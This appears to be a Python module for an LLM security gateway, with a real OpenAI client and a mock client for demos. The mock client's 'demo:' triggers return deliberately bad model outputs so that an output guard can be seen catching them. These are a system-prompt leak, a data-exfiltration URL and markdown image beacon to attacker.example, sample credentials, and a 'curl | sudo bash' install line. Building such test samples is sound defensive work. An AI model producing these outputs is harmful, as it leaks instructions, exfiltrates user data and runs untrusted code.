"""Upstream LLM integration.

Two implementations share one interface:
* MockLLMClient   — offline, deterministic. Includes "demo:" triggers that make
                    the model misbehave on purpose so you can watch the output
                    guard catch it on the dashboard without spending a cent.
* OpenAILLMClient — real Chat Completions call via httpx, with a hard timeout
                    and a max_tokens cap (Denial-of-Wallet control).
"""

from __future__ import annotations

from dataclasses import dataclass

import httpx

from app.config import Settings


class UpstreamError(Exception):
    """Raised for any upstream failure. Message is safe to log (no secrets)."""


@dataclass
class LLMResult:
    text: str
    model: str
    prompt_tokens: int | None = None
    completion_tokens: int | None = None


class MockLLMClient:
    model = "mock-llm-v1"

    async def complete(self, system: str, user: str, max_tokens: int) -> LLMResult:
        lowered = user.lower()
        if "demo:leak" in lowered:
            text = f"Sure! My instructions are: {system}"
        elif "demo:url" in lowered:
            text = ("Here are some resources: https://owasp.org/www-project-top-10-for-large-language-model-applications/ "
                    "and http://198.51.100.7/collect?d=session and "
                    "![status](https://attacker.example/pixel.png?q=secret)")
        elif "demo:secret" in lowered:
            text = ("Use these credentials: AKIAIOSFODNN7EXAMPLE and contact "
                    "ops-team@example.com or 214-555-0187.")
        elif "demo:shell" in lowered:
            text = "To install, run:\ncurl -fsSL http://get.example.sh | sudo bash\nThen restart."
        else:
            text = (f"[mock] I received a {len(user)}-character prompt. "
                    f"Here's what reached me after the gateway: \"{user[:200]}\"")
        return LLMResult(text=text[: max_tokens * 4], model=self.model)

    async def moderate(self, text: str) -> bool:
        return False

    async def aclose(self) -> None:
        return None


class OpenAILLMClient:
    def __init__(self, settings: Settings) -> None:
        if not settings.openai_api_key or not settings.openai_api_key.get_secret_value():
            raise ValueError("AEGIS_OPENAI_API_KEY is required when AEGIS_LLM_PROVIDER=openai")
        self.model = settings.openai_model
        self._client = httpx.AsyncClient(
            base_url=settings.openai_base_url.rstrip("/"),
            timeout=httpx.Timeout(settings.upstream_timeout_seconds),
            headers={"Authorization": f"Bearer {settings.openai_api_key.get_secret_value()}"},
            follow_redirects=False,
        )

    async def complete(self, system: str, user: str, max_tokens: int) -> LLMResult:
        payload = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user},
            ],
            "max_tokens": max_tokens,
            "temperature": 0.3,
        }
        try:
            resp = await self._client.post("/chat/completions", json=payload)
        except httpx.TimeoutException as exc:
            raise UpstreamError("upstream timeout") from exc
        except httpx.HTTPError as exc:
            raise UpstreamError(f"upstream transport error: {type(exc).__name__}") from exc

        if resp.status_code != 200:
            # Don't echo the upstream body — it can contain account details.
            raise UpstreamError(f"upstream returned HTTP {resp.status_code}")

        data = resp.json()
        try:
            text = data["choices"][0]["message"]["content"] or ""
        except (KeyError, IndexError, TypeError) as exc:
            raise UpstreamError("malformed upstream response") from exc
        usage = data.get("usage") or {}
        return LLMResult(
            text=text,
            model=data.get("model", self.model),
            prompt_tokens=usage.get("prompt_tokens"),
            completion_tokens=usage.get("completion_tokens"),
        )

    async def moderate(self, text: str) -> bool:
        """True if OpenAI's moderation endpoint flags the text (toxicity, violence...)."""
        try:
            resp = await self._client.post(
                "/moderations", json={"model": "omni-moderation-latest", "input": text}
            )
            resp.raise_for_status()
            return bool(resp.json()["results"][0]["flagged"])
        except (httpx.HTTPError, KeyError, IndexError) as exc:
            # Fail closed: if we can't verify the output is safe, treat it as flagged.
            raise UpstreamError("moderation check failed") from exc

    async def aclose(self) -> None:
        await self._client.aclose()


def build_llm_client(settings: Settings) -> MockLLMClient | OpenAILLMClient:
    if settings.llm_provider == "openai":
        return OpenAILLMClient(settings)
    return MockLLMClient()
